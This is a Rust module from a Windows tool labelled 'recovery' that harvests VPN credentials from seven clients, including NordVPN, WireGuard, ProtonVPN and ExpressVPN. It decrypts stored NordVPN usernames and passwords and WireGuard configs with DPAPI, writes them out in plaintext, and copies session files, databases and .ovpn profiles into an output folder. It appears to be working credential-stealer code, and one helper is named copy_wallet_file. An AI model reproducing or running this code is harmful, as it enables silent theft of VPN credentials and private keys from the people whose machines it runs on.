use crate::recovery::{
    context::RecoveryContext,
    fs::sanitize_label,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use base64::Engine;
use quick_xml::Reader;
use quick_xml::events::Event;
use std::collections::hash_map::DefaultHasher;
use std::ffi::c_void;
use std::ffi::{OsStr, OsString};
use std::hash::{Hash, Hasher};
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::{fs, io::AsyncWriteExt};
use walkdir::WalkDir;
use windows::Win32::Foundation::{HLOCAL, LocalFree};
use windows::Win32::Security::Cryptography::{
    CRYPT_INTEGER_BLOB, CRYPTPROTECT_LOCAL_MACHINE, CryptUnprotectData,
};
use winreg::RegKey;
use winreg::enums::HKEY_LOCAL_MACHINE;

pub fn vpn_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![
        Arc::new(NordVpnTask),
        Arc::new(OpenVpnTask),
        Arc::new(ProtonVpnTask {
            base: ctx.local_data_dir.join("ProtonVPN"),
        }),
        Arc::new(SurfsharkTask {
            source: ctx.roaming_data_dir.join("Surfshark"),
        }),
        Arc::new(WireGuardTask),
        Arc::new(ExpressVpnTask),
        Arc::new(TunnelBearTask),
    ]
}

struct NordVpnTask;

#[async_trait]
impl RecoveryTask for NordVpnTask {
    fn label(&self) -> String {
        "NordVPN Credentials".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::VPNs
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let base = ctx.local_data_dir.join("NordVPN");
        if !base.exists() {
            return Ok(Vec::new());
        }

        let mut log = String::new();
        let mut versions = fs::read_dir(&base).await?;
        while let Some(version) = versions.next_entry().await? {
            let version_name = version.file_name().to_string_lossy().to_string();
            if !version_name.starts_with("NordVpn.exe") {
                continue;
            }

            let mut users = fs::read_dir(version.path()).await?;
            while let Some(user_dir) = users.next_entry().await? {
                log.push_str(&format!(
                    "\tFound version {}\n",
                    user_dir.file_name().to_string_lossy()
                ));
                let config_path = user_dir.path().join("user.config");
                if config_path.exists() {
                    if let Ok(content) = fs::read_to_string(&config_path).await {
                        let username = extract_setting_value(&content, b"Username")
                            .and_then(|value| decode_nord_value(&value));
                        let password = extract_setting_value(&content, b"Password")
                            .and_then(|value| decode_nord_value(&value));

                        if let Some(name) = username {
                            log.push_str(&format!("\t\tUsername: {name}\n"));
                        }
                        if let Some(secret) = password {
                            log.push_str(&format!("\t\tPassword: {secret}\n"));
                        }
                    }
                }
            }
        }

        if log.is_empty() {
            return Ok(Vec::new());
        }

        let artifact = write_text_artifact(ctx, &self.label(), "nordvpn-account.log", &log).await?;
        Ok(vec![artifact])
    }
}

struct WireGuardTask;

#[async_trait]
impl RecoveryTask for WireGuardTask {
    fn label(&self) -> String {
        "WireGuard Configs".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::VPNs
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let paths = vec![
            PathBuf::from(r"C:\Program Files\WireGuard\Data\Configurations"),
            ctx.local_data_dir.join("WireGuard").join("Configurations"),
        ];

        let output_dir = vpn_output_dir(ctx, &self.label()).await?;

        for base in paths {
            if !base.exists() {
                continue;
            }

            let mut entries = match fs::read_dir(&base).await {
                Ok(e) => e,
                Err(_) => continue,
            };

            while let Some(entry) = entries.next_entry().await? {
                let path = entry.path();
                if !path.is_file() {
                    continue;
                }

                let extension = path.extension().and_then(|e| e.to_str()).unwrap_or("");
                let file_name = path
                    .file_stem()
                    .and_then(|s| s.to_str())
                    .unwrap_or("unknown");

                if extension == "conf" {
                    let dest = output_dir.join(format!("{}.conf", file_name));
                    match fs::copy(&path, &dest).await {
                        Ok(_) => {
                            if let Ok(meta) = fs::metadata(&dest).await {
                                artifacts.push(RecoveryArtifact {
                                    label: self.label(),
                                    path: dest,
                                    size_bytes: meta.len(),
                                    modified: meta.modified().ok(),
                                });
                            }
                        }
                        Err(_) => continue,
                    }
                } else if extension == "dpapi" && path.to_string_lossy().ends_with(".conf.dpapi") {
                    if let Ok(encrypted_data) = fs::read(&path).await {
                        if let Some(decrypted) = dpapi_unprotect(&encrypted_data) {
                            let dest = output_dir.join(format!("{}.conf", file_name));
                            if let Ok(mut file) = fs::File::create(&dest).await {
                                if file.write_all(&decrypted).await.is_ok() {
                                    if let Ok(meta) = fs::metadata(&dest).await {
                                        artifacts.push(RecoveryArtifact {
                                            label: self.label(),
                                            path: dest,
                                            size_bytes: meta.len(),
                                            modified: meta.modified().ok(),
                                        });
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        Ok(artifacts)
    }
}

struct ExpressVpnTask;

#[async_trait]
impl RecoveryTask for ExpressVpnTask {
    fn label(&self) -> String {
        "ExpressVPN Data".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::VPNs
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let base = ctx.local_data_dir.join("ExpressVPN");
        if !base.exists() {
            return Ok(artifacts);
        }

        let output_dir = vpn_output_dir(ctx, &self.label()).await?;

        for entry in WalkDir::new(base).into_iter().filter_map(|e| e.ok()) {
            if entry.file_type().is_file() {
                let name = entry.file_name().to_string_lossy();
                if name == "data.db" || name == "database.db" || name.ends_with(".ovpn") {
                    let parent_hash = path_hash(entry.path().parent().unwrap_or(Path::new(".")));
                    let unique_name = format!("{}_{}", parent_hash, name);
                    let dest = output_dir.join(unique_name);

                    match fs::copy(entry.path(), &dest).await {
                        Ok(_) => {
                            if let Ok(meta) = fs::metadata(&dest).await {
                                artifacts.push(RecoveryArtifact {
                                    label: self.label(),
                                    path: dest,
                                    size_bytes: meta.len(),
                                    modified: meta.modified().ok(),
                                });
                            }
                        }
                        Err(_) => continue,
                    }
                }
            }
        }

        Ok(artifacts)
    }
}

struct TunnelBearTask;

#[async_trait]
impl RecoveryTask for TunnelBearTask {
    fn label(&self) -> String {
        "TunnelBear Configs".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::VPNs
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let base = ctx.local_data_dir.join("TunnelBear");
        let output_dir = vpn_output_dir(ctx, &self.label()).await?;

        let configs = find_dotnet_based_configs(&base, "TunnelBear.exe").await?;
        for config_path in configs {
            let parent_hash = path_hash(config_path.parent().unwrap_or(Path::new(".")));
            let dest_name = format!("{}_user.config", parent_hash);
            let dest = output_dir.join(dest_name);

            match fs::copy(&config_path, &dest).await {
                Ok(_) => {
                    if let Ok(meta) = fs::metadata(&dest).await {
                        artifacts.push(RecoveryArtifact {
                            label: self.label(),
                            path: dest,
                            size_bytes: meta.len(),
                            modified: meta.modified().ok(),
                        });
                    }
                }
                Err(_) => continue,
            }
        }

        Ok(artifacts)
    }
}

struct OpenVpnTask;

#[async_trait]
impl RecoveryTask for OpenVpnTask {
    fn label(&self) -> String {
        "OpenVPN Configs".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::VPNs
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let dest = vpn_output_dir(ctx, &self.label()).await?;
        if let Some(config_dir) = query_registry_config_dir() {
            copy_ovpn_files(
                &self.label(),
                &config_dir,
                &dest.join("from_registry"),
                &mut artifacts,
            )
            .await?;
        }

        let user_config = ctx.home_dir.join("OpenVPN").join("config");
        copy_ovpn_files(
            &self.label(),
            &user_config,
            &dest.join("from_profile"),
            &mut artifacts,
        )
        .await?;
        Ok(artifacts)
    }
}

struct ProtonVpnTask {
    base: PathBuf,
}

#[async_trait]
impl RecoveryTask for ProtonVpnTask {
    fn label(&self) -> String {
        "ProtonVPN Sessions".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::VPNs
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        if !self.base.exists() {
            return Ok(artifacts);
        }

        let dest_root = vpn_output_dir(ctx, &self.label()).await?;
        let mut entries = fs::read_dir(&self.base).await?;
        while let Some(entry) = entries.next_entry().await? {
            if !entry.file_type().await?.is_dir() {
                continue;
            }

            let dir_name = entry.file_name().to_string_lossy().to_string();
            if !dir_name.starts_with("ProtonVPN.exe") {
                continue;
            }

            let entry_hash = path_hash(&entry.path());
            let mut users = fs::read_dir(entry.path()).await?;
            while let Some(user_dir) = users.next_entry().await? {
                if !user_dir.file_type().await?.is_dir() {
                    continue;
                }

                let user_config = user_dir.path().join("user.config");
                if user_config.exists() {
                    let user_hash = path_hash(&user_dir.path());
                    let dest = dest_root.join(&entry_hash).join(&user_hash);
                    copy_wallet_file(&self.label(), &user_config, &dest, &mut artifacts).await?;
                }
            }
        }

        Ok(artifacts)
    }
}

struct SurfsharkTask {
    source: PathBuf,
}

#[async_trait]
impl RecoveryTask for SurfsharkTask {
    fn label(&self) -> String {
        "Surfshark Configs".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::VPNs
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        if !self.source.exists() {
            return Ok(artifacts);
        }

        let dest_root = vpn_output_dir(ctx, &self.label()).await?;
        let files = [
            "data.dat",
            "settings.dat",
            "settings-log.dat",
            "private_settings.dat",
        ];
        for file in &files {
            let source_file = self.source.join(file);
            copy_wallet_file(&self.label(), &source_file, &dest_root, &mut artifacts).await?;
        }

        Ok(artifacts)
    }
}

async fn vpn_output_dir(ctx: &RecoveryContext, label: &str) -> Result<PathBuf, RecoveryError> {
    let folder = ctx
        .output_dir
        .join("services")
        .join("VPNs")
        .join(sanitize_label(label));
    fs::create_dir_all(&folder).await?;
    Ok(folder)
}

async fn write_text_artifact(
    ctx: &RecoveryContext,
    label: &str,
    file_name: &str,
    contents: &str,
) -> Result<RecoveryArtifact, RecoveryError> {
    let folder = vpn_output_dir(ctx, label).await?;
    let target = folder.join(file_name);
    let mut file = fs::File::create(&target).await?;
    file.write_all(contents.as_bytes()).await?;
    file.flush().await?;
    let meta = fs::metadata(&target).await?;
    Ok(RecoveryArtifact {
        label: label.to_string(),
        path: target,
        size_bytes: meta.len(),
        modified: meta.modified().ok(),
    })
}

fn extract_setting_value(xml: &str, target: &[u8]) -> Option<String> {
    let mut reader = Reader::from_str(xml);
    reader.trim_text(true);
    let mut current_setting: Option<String> = None;
    let mut capture = false;

    loop {
        match reader.read_event() {
            Ok(Event::Start(ref e)) if e.name().as_ref() == b"setting" => {
                let mut attrs = e.attributes();
                while let Some(Ok(attr)) = attrs.next() {
                    if attr.key.as_ref() == b"name" {
                        if let Ok(value) = attr.unescape_value() {
                            current_setting = Some(value.to_string());
                        }
                        break;
                    }
                }
            }
            Ok(Event::Start(ref e)) if e.name().as_ref() == b"value" => {
                if current_setting.as_deref().map(|n| n.as_bytes() == target) == Some(true) {
                    capture = true;
                }
            }
            Ok(Event::Text(e)) if capture => {
                let text = e.unescape().ok()?;
                return Some(text.to_string());
            }
            Ok(Event::End(ref e)) if e.name().as_ref() == b"value" => {
                capture = false;
            }
            Ok(Event::End(ref e)) if e.name().as_ref() == b"setting" => {
                current_setting = None;
            }
            Ok(Event::Eof) => break,
            Err(_) => break,
            _ => {}
        }
    }

    None
}

fn decode_nord_value(encoded: &str) -> Option<String> {
    let data = base64::engine::general_purpose::STANDARD
        .decode(encoded)
        .ok()?;
    let decrypted = dpapi_unprotect(&data)?;
    String::from_utf8(decrypted).ok()
}

fn dpapi_unprotect(encrypted: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: encrypted.len() as u32,
            pbData: encrypted.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB::default();

        let success = CryptUnprotectData(
            &mut input,
            None,
            None,
            None,
            None,
            CRYPTPROTECT_LOCAL_MACHINE,
            &mut output,
        );

        if success.is_err() {
            return None;
        }

        let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize);
        let result = slice.to_vec();
        if !output.pbData.is_null() {
            let _ = LocalFree(HLOCAL(output.pbData as *mut c_void));
        }
        Some(result)
    }
}

fn query_registry_config_dir() -> Option<PathBuf> {
    RegKey::predef(HKEY_LOCAL_MACHINE)
        .open_subkey("SOFTWARE")
        .ok()
        .and_then(|key| key.open_subkey("OpenVPN").ok())
        .and_then(|openvpn| openvpn.get_value::<String, _>("config_dir").ok())
        .map(PathBuf::from)
}

async fn copy_ovpn_files(
    label: &str,
    src: &Path,
    dst: &Path,
    artifacts: &mut Vec<RecoveryArtifact>,
) -> Result<(), RecoveryError> {
    if !src.exists() {
        return Ok(());
    }

    fs::create_dir_all(dst).await?;
    for entry in WalkDir::new(src)
        .into_iter()
        .filter_map(Result::ok)
        .filter(|entry| entry.file_type().is_file())
    {
        if entry
            .path()
            .extension()
            .and_then(OsStr::to_str)
            .map(|ext| ext.eq_ignore_ascii_case("ovpn"))
            == Some(true)
        {
            let destination = dst.join(entry.file_name());
            fs::copy(entry.path(), &destination).await?;
            let meta = fs::metadata(&destination).await?;
            artifacts.push(RecoveryArtifact {
                label: label.to_string(),
                path: destination,
                size_bytes: meta.len(),
                modified: meta.modified().ok(),
            });
        }
    }

    Ok(())
}

fn path_hash(path: &Path) -> String {
    let mut hasher = DefaultHasher::new();
    path.hash(&mut hasher);
    hasher.finish().to_string()
}

async fn copy_wallet_file(
    label: &str,
    src: &Path,
    dst: &Path,
    artifacts: &mut Vec<RecoveryArtifact>,
) -> Result<(), RecoveryError> {
    if !src.exists() {
        return Ok(());
    }
    fs::create_dir_all(dst).await?;
    let file_name = src.file_name().map(|name| name.to_os_string());
    let dest = dst.join(file_name.unwrap_or_else(|| OsString::from("file")));
    fs::copy(src, &dest).await?;
    let meta = fs::metadata(&dest).await?;
    artifacts.push(RecoveryArtifact {
        label: label.to_string(),
        path: dest,
        size_bytes: meta.len(),
        modified: meta.modified().ok(),
    });
    Ok(())
}

async fn find_dotnet_based_configs(
    base_dir: &Path,
    exe_prefix: &str,
) -> Result<Vec<PathBuf>, RecoveryError> {
    let mut config_paths = Vec::new();
    if !base_dir.exists() {
        return Ok(config_paths);
    }

    let mut top_entries = fs::read_dir(base_dir).await?;
    while let Some(top_entry) = top_entries.next_entry().await? {
        let name = top_entry.file_name().to_string_lossy().to_string();
        if !name.starts_with(exe_prefix) {
            continue;
        }

        let mut version_entries = match fs::read_dir(top_entry.path()).await {
            Ok(e) => e,
            Err(_) => continue,
        };

        while let Some(version_entry) = version_entries.next_entry().await? {
            let config_path = version_entry.path().join("user.config");
            if config_path.exists() {
                config_paths.push(config_path);
            }
        }
    }
    Ok(config_paths)
}
